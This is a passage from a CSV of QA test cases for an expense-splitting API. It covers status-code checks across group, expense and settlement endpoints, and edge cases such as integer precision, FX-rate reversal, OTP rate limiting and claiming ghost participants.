2. Inspect the HTTP status code and response body","POST /v1/join/:inviteCode, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-030,API Status Coverage - POST /v1/groups/:id/expenses,Negative,Critical,POST /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/groups/:id/expenses under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/expenses, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-031,API Status Coverage - POST /v1/groups/:id/expenses,Negative,Critical,POST /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/groups/:id/expenses under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/expenses, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-032,API Status Coverage - POST /v1/groups/:id/expenses,Permission,Critical,"POST /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/groups/:id/expenses under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/expenses, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-033,API Status Coverage - POST /v1/groups/:id/expenses,Negative,Critical,POST /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/groups/:id/expenses under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/expenses, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-034,API Status Coverage - POST /v1/groups/:id/expenses,Negative,Critical,POST /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/groups/:id/expenses under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/groups/:id/expenses, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-035,API Status Coverage - GET /v1/groups/:id/expenses,Negative,Critical,GET /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue GET /v1/groups/:id/expenses under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/expenses, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-036,API Status Coverage - GET /v1/groups/:id/expenses,Permission,Critical,"GET /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue GET /v1/groups/:id/expenses under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/expenses, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-037,API Status Coverage - GET /v1/groups/:id/expenses,Negative,Critical,GET /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue GET /v1/groups/:id/expenses under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/expenses, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-038,API Status Coverage - GET /v1/groups/:id/expenses,Negative,Critical,GET /v1/groups/:id/expenses is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue GET /v1/groups/:id/expenses under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/expenses, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-039,API Status Coverage - PUT /v1/expenses/:id,Negative,Critical,PUT /v1/expenses/:id is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue PUT /v1/expenses/:id under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","PUT /v1/expenses/:id, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-040,API Status Coverage - PUT /v1/expenses/:id,Negative,Critical,PUT /v1/expenses/:id is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue PUT /v1/expenses/:id under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","PUT /v1/expenses/:id, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-041,API Status Coverage - PUT /v1/expenses/:id,Permission,Critical,"PUT /v1/expenses/:id is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue PUT /v1/expenses/:id under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","PUT /v1/expenses/:id, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-042,API Status Coverage - PUT /v1/expenses/:id,Negative,Critical,PUT /v1/expenses/:id is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue PUT /v1/expenses/:id under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","PUT /v1/expenses/:id, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-043,API Status Coverage - PUT /v1/expenses/:id,Negative,Critical,PUT /v1/expenses/:id is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue PUT /v1/expenses/:id under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","PUT /v1/expenses/:id, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-044,API Status Coverage - DELETE /v1/expenses/:id,Negative,Critical,DELETE /v1/expenses/:id is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue DELETE /v1/expenses/:id under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","DELETE /v1/expenses/:id, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-045,API Status Coverage - DELETE /v1/expenses/:id,Permission,Critical,"DELETE /v1/expenses/:id is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue DELETE /v1/expenses/:id under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","DELETE /v1/expenses/:id, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-046,API Status Coverage - DELETE /v1/expenses/:id,Negative,Critical,DELETE /v1/expenses/:id is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue DELETE /v1/expenses/:id under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","DELETE /v1/expenses/:id, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-047,API Status Coverage - DELETE /v1/expenses/:id,State-Sequence,Critical,"DELETE /v1/expenses/:id is reachable and reproducible per its documented preconditions (the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)).","1. Issue DELETE /v1/expenses/:id under conditions that trigger 409: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)
2. Inspect the HTTP status code and response body","DELETE /v1/expenses/:id, condition: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)",Response status = 409 Conflict. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 409 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-048,API Status Coverage - DELETE /v1/expenses/:id,Negative,Critical,DELETE /v1/expenses/:id is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue DELETE /v1/expenses/:id under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","DELETE /v1/expenses/:id, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-049,API Status Coverage - GET /v1/groups/:id/settlements/suggestions,Negative,Critical,GET /v1/groups/:id/settlements/suggestions is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue GET /v1/groups/:id/settlements/suggestions under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/settlements/suggestions, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-050,API Status Coverage - GET /v1/groups/:id/settlements/suggestions,Permission,Critical,"GET /v1/groups/:id/settlements/suggestions is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue GET /v1/groups/:id/settlements/suggestions under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/settlements/suggestions, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-051,API Status Coverage - GET /v1/groups/:id/settlements/suggestions,Negative,Critical,GET /v1/groups/:id/settlements/suggestions is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue GET /v1/groups/:id/settlements/suggestions under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/settlements/suggestions, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-052,API Status Coverage - GET /v1/groups/:id/settlements/suggestions,Negative,Critical,GET /v1/groups/:id/settlements/suggestions is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue GET /v1/groups/:id/settlements/suggestions under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","GET /v1/groups/:id/settlements/suggestions, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-053,API Status Coverage - POST /v1/settlements/intents,Negative,Critical,POST /v1/settlements/intents is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/settlements/intents under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-054,API Status Coverage - POST /v1/settlements/intents,Negative,Critical,POST /v1/settlements/intents is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/settlements/intents under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-055,API Status Coverage - POST /v1/settlements/intents,Permission,Critical,"POST /v1/settlements/intents is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/settlements/intents under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-056,API Status Coverage - POST /v1/settlements/intents,Negative,Critical,POST /v1/settlements/intents is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/settlements/intents under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-057,API Status Coverage - POST /v1/settlements/intents/:id/proof,Negative,Critical,POST /v1/settlements/intents/:id/proof is reachable and reproducible per its documented preconditions (malformed/invalid request body (e.g. missing required field or wrong type)).,"1. Issue POST /v1/settlements/intents/:id/proof under conditions that trigger 400: malformed/invalid request body (e.g. missing required field or wrong type)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/proof, condition: malformed/invalid request body (e.g. missing required field or wrong type)",Response status = 400 Bad Request. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 400 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-058,API Status Coverage - POST /v1/settlements/intents/:id/proof,Negative,Critical,POST /v1/settlements/intents/:id/proof is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/settlements/intents/:id/proof under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/proof, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-059,API Status Coverage - POST /v1/settlements/intents/:id/proof,Permission,Critical,"POST /v1/settlements/intents/:id/proof is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/settlements/intents/:id/proof under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/proof, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-060,API Status Coverage - POST /v1/settlements/intents/:id/proof,Negative,Critical,POST /v1/settlements/intents/:id/proof is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/settlements/intents/:id/proof under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/proof, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-061,API Status Coverage - POST /v1/settlements/intents/:id/proof,Negative,Critical,POST /v1/settlements/intents/:id/proof is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/settlements/intents/:id/proof under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/proof, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-062,API Status Coverage - POST /v1/settlements/intents/:id/confirm,Negative,Critical,POST /v1/settlements/intents/:id/confirm is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/settlements/intents/:id/confirm under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/confirm, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-063,API Status Coverage - POST /v1/settlements/intents/:id/confirm,Permission,Critical,"POST /v1/settlements/intents/:id/confirm is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/settlements/intents/:id/confirm under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/confirm, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-064,API Status Coverage - POST /v1/settlements/intents/:id/confirm,Negative,Critical,POST /v1/settlements/intents/:id/confirm is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/settlements/intents/:id/confirm under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/confirm, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-065,API Status Coverage - POST /v1/settlements/intents/:id/confirm,State-Sequence,Critical,"POST /v1/settlements/intents/:id/confirm is reachable and reproducible per its documented preconditions (the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)).","1. Issue POST /v1/settlements/intents/:id/confirm under conditions that trigger 409: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/confirm, condition: the request conflicts with current resource state (already joined, already voided, already confirmed, etc.)",Response status = 409 Conflict. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 409 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-066,API Status Coverage - POST /v1/settlements/intents/:id/confirm,Negative,Critical,POST /v1/settlements/intents/:id/confirm is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/settlements/intents/:id/confirm under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/confirm, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-067,API Status Coverage - POST /v1/settlements/intents/:id/dispute,Negative,Critical,POST /v1/settlements/intents/:id/dispute is reachable and reproducible per its documented preconditions (no or invalid/expired JWT supplied).,"1. Issue POST /v1/settlements/intents/:id/dispute under conditions that trigger 401: no or invalid/expired JWT supplied
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/dispute, condition: no or invalid/expired JWT supplied",Response status = 401 Unauthorized. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 401 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-068,API Status Coverage - POST /v1/settlements/intents/:id/dispute,Permission,Critical,"POST /v1/settlements/intents/:id/dispute is reachable and reproducible per its documented preconditions (authenticated but lacking the required role/permission, or not a group member).","1. Issue POST /v1/settlements/intents/:id/dispute under conditions that trigger 403: authenticated but lacking the required role/permission, or not a group member
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/dispute, condition: authenticated but lacking the required role/permission, or not a group member",Response status = 403 Forbidden. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 403 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-069,API Status Coverage - POST /v1/settlements/intents/:id/dispute,Negative,Critical,POST /v1/settlements/intents/:id/dispute is reachable and reproducible per its documented preconditions (the referenced resource id (group/expense/settlement/invite code) does not exist).,"1. Issue POST /v1/settlements/intents/:id/dispute under conditions that trigger 404: the referenced resource id (group/expense/settlement/invite code) does not exist
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/dispute, condition: the referenced resource id (group/expense/settlement/invite code) does not exist",Response status = 404 Not Found. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 404 class of error.,Section 5 API Reference,Systematic status-code coverage pass; see feature-specific sections above for the detailed business-logic scenario behind each code
TC-API-070,API Status Coverage - POST /v1/settlements/intents/:id/dispute,Negative,Critical,POST /v1/settlements/intents/:id/dispute is reachable and reproducible per its documented preconditions (an unexpected server-side failure (e.g. simulated DB outage)).,"1. Issue POST /v1/settlements/intents/:id/dispute under conditions that trigger 500: an unexpected server-side failure (e.g. simulated DB outage)
2. Inspect the HTTP status code and response body","POST /v1/settlements/intents/:id/dispute, condition: an unexpected server-side failure (e.g. simulated DB outage)",Response status = 500 Internal Server Error. Response body follows the API's standard error envelope (error code/message) and leaks no internal stack trace or sensitive data for the 500 class of error.,Section 5 API Reference,"500-path: verify graceful degradation, no sensitive info in error body"
TC-API-071,API - Unsupported Method,Negative,Low,None,1. Issue an unsupported HTTP method (e.g. PATCH) against POST /v1/groups,PATCH /v1/groups,405 Method Not Allowed.,Section 5 API Reference,
TC-API-072,API - Unknown Route,Negative,Low,None,1. GET /v1/nonexistent-route,Unknown route,"404 Not Found (generic NestJS routing 404, not a business 404).",Section 5 API Reference,
TC-API-073,API - Versioning,Boundary,Low,None,1. GET /v2/groups (a version prefix that doesn't exist),Unsupported API version prefix,404 Not Found: only /v1/* is documented as implemented.,Section 5 API Reference - all routes prefixed /v1,
TC-API-074,API - Rate Limiting,Boundary,Medium,None,1. Issue 1000 rapid POST /v1/auth/request-otp calls for the same phone number in under a minute,OTP request flood,UNVERIFIED — doc doesn't document any rate-limiting middleware; expected a 429 Too Many Requests after some threshold to prevent SMS-cost abuse; confirm with dev whether rate limiting exists at all.,Section 5/8 - no rate-limit documented,Known gap: no documented rate limiting on OTP-triggering endpoints — cost/abuse risk
TC-API-075,API - CORS,Boundary,Low,Web client at a disallowed origin,1. Issue a cross-origin request from an unlisted origin domain with an Origin header,Disallowed Origin header,UNVERIFIED — CORS policy not documented; expected the response to omit Access-Control-Allow-Origin for disallowed origins; confirm allowed-origins list with dev.,Section 5 API Reference,
TC-GAP-001,Known Gap - JS Number Safety,Boundary,Critical,None,"1. Attempt to create an expense with totalAmountMinor = 2^53 (9007199254740992), one above MAX_SAFE_INTEGER",totalAmountMinor = 2^53,"UNVERIFIED — this is the doc's own flagged risk area (Section 10 Gap #1); confirm whether the API enforces a hard cap well below MAX_SAFE_INTEGER (e.g. a sane real-world expense ceiling) rather than relying on JS's 2^53 boundary, since serialization (JSON) and any float arithmetic anywhere in the pipeline could silently corrupt values at this scale.",Section 10 Gap #1,Direct deep-dive on documented known gap #1
TC-GAP-002,Known Gap - JS Number Safety,Boundary,High,None,"1. Create an expense with totalAmountMinor = 9007199254740991 (exactly MAX_SAFE_INTEGER) split equally among 3 participants, forcing RoundingAllocator division",MAX_SAFE_INTEGER split 3 ways,Verify RoundingAllocator's floating-point division step (amountMinor * weight / totalWeight) does not lose precision at this magnitude — the three resulting shares must still sum EXACTLY to 9007199254740991 with no float drift.,Section 10 Gap #1; Section 3.2 RoundingAllocator,Precision-critical: RoundingAllocator uses floating-point division internally
TC-GAP-003,Known Gap - FX Reversal Rate,Happy Path,Critical,USD expense created with FxRateSnapshotEntity capturing rate=83.10; expense is edited (not voided) after the rate has moved to 84.00,"1. Edit the USD expense's amount, triggering a reversal of old postings and creation of new ones per PUT /v1/expenses/:id",Edit after FX rate drift,"UNVERIFIED — same class of gap as Gap #2 but for EDIT rather than void/dispute: confirm the reversal-and-repost cycle during an edit correctly looks up the ORIGINAL eventId's captured rate for the reversal leg, and only uses a fresh rate (if any) for the NEW posting leg; confirm exact behavior with dev.",Section 10 Gap #2,"Extension of documented Gap #2 to the edit-expense flow, not just dispute/reversal"
TC-GAP-004,Known Gap - Ghost Claim,State-Sequence,Critical,"Ghost participant 'Rahul' (userId=null) is a member of THREE different groups simultaneously, each with different outstanding balances","1. Rahul's phone number is claimed by a real signup
2. Verify ALL THREE groups' ParticipantEntity.userId are backfilled and all three GroupBalanceProjectionEntity rows remain accurate post-claim",Ghost claim spanning multiple groups,"UNVERIFIED — doc's Gap #3 discussion is framed around a single group/participant; confirm the claim-matching logic (via ContactAliasEntity) correctly updates EVERY ParticipantEntity row across ALL groups tied to that phone/email, not just one; confirm with dev.",Section 10 Gap #3,Extension of documented Gap #3 to the multi-group case
